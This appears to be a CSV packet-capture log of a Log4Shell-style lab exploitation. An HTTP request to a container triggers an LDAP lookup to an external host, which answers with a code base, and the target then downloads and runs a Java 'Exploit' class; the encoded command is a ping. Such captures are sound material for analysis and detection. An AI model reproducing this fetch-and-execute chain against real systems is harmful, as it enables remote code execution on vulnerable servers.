no,time,timestamp,src_ip,dst_ip,src_port,dst_port,protocol,length,info
4,0.000107,2021-12-22T15:46:03.293713,172.17.0.1,172.17.0.3,50172,8000,HTTP,349,"GET /test HTTP/1.1; Authorization: Basic <base64>; candidate=http_header.authorization"
9,0.012720,2021-12-22T15:46:03.306326,172.17.0.3,34.91.73.37,54590,1389,LDAP,66,"LDAP bindRequest"
11,0.014060,2021-12-22T15:46:03.307666,34.91.73.37,172.17.0.3,1389,54590,LDAP,66,"LDAP bindResponse"
13,0.014340,2021-12-22T15:46:03.307946,172.17.0.3,34.91.73.37,54590,1389,LDAP,165,"LDAP searchRequest; query=Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x"
15,0.022770,2021-12-22T15:46:03.316376,34.91.73.37,172.17.0.3,1389,54590,LDAP,251,"LDAP searchResultEntry; javaCodeBase=http://34.91.73.37:80/"
22,0.024512,2021-12-22T15:46:03.318118,172.17.0.3,34.91.73.37,42082,80,HTTP,226,"GET /ExploitN3Mwwy59tU.class HTTP/1.1"
24,0.028522,2021-12-22T15:46:03.322128,34.91.73.37,172.17.0.3,80,42082,HTTP,130,"HTTP/1.1 200 OK; Content-length: 1217"
26,0.028907,2021-12-22T15:46:03.322513,34.91.73.37,172.17.0.3,80,42082,TCP,1269,"Java class payload response; binary content"
112,0.068868,2021-12-22T15:46:03.362474,172.17.0.3,172.17.0.1,8000,50172,HTTP,128,"HTTP/1.1 200 OK; Content-length: 20"
114,0.068942,2021-12-22T15:46:03.362548,172.17.0.3,172.17.0.1,8000,50172,HTTP,72,"HTTP response body: This is the response"
